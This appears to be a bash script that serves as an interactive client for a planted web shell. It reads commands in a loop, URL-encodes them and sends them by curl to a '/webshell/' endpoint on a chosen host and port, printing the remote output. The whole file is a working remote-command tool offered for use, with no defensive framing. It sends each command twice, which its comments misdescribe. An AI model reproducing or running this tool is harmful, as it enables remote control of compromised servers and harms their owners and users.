#!/usr/bin/env bash

# Prompt for host and port
read -p 'Host: ' host
read -p 'Port: ' port

while true; do
    # Prompt for the raw command
    read -p '$ ' raw_command

    # URL encode the command
    command=$(printf "%s" "$raw_command" | jq -sRr @uri)

    # Send the request and capture the response and HTTP status code
    response=$(curl -s -w "%{http_code}" -o /dev/null "http://${host}:${port}/webshell/${command}")
    
    # Check if the HTTP status code is valid and numeric
    if [[ "$response" =~ ^[0-9]+$ ]]; then
        if [ "$response" -eq 200 ]; then
            # Execute the command if HTTP 200 is received
            curl -s "http://${host}:${port}/webshell/${command}"
        else
            # Print an error for other HTTP status codes
            echo "Error: HTTP Status Code ${response}"
        fi
    else
        # Print an error if the HTTP status code is invalid
        echo "Error: Invalid HTTP status code received"
    fi
done
